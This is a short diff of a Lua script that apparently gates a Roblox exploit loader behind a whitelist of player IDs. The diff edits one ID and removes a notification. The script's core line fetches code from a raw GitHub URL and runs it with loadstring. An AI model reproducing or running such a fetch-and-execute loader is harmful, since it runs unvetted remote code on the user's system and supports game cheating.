@@ -5,17 +5,10 @@ local WhitelistedIds = {
     2673957768,
     2258274790,
     93046029,
-    2742543671, -- etc.. add on to this with actual player ids
+    2742541671, -- etc.. add on to this with actual player ids
 }
 
 if table.find(WhitelistedIds, Player.UserId) then
-game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title = "Whitelist";
-    Text = "Checking...";
-    Icon = "rbxassetid://2541869220";
-    Duration = 3
-	})
-wait(5)
     loadstring(game:HttpGet("https://raw.githubusercontent.com/L4W13T/MTRNFESX/main/1whlms", true))()
 else
     Player:Kick("You are not whitelisted to use this script")
